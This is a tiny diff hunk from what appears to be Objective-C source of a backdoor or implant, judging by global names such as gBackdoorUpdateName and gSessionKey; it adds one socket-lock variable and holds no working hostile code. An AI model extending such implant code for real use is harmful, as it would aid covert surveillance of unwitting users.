@@ -65,6 +65,7 @@ NSString *gBackdoorUpdateName       = nil;
 NSString *gConfigurationName        = nil;
 NSString *gConfigurationUpdateName  = nil;
 NSData   *gSessionKey               = nil;
+int       gLockSock                 = -1;
 
 // OS version
 u_int gOSMajor  = 0;
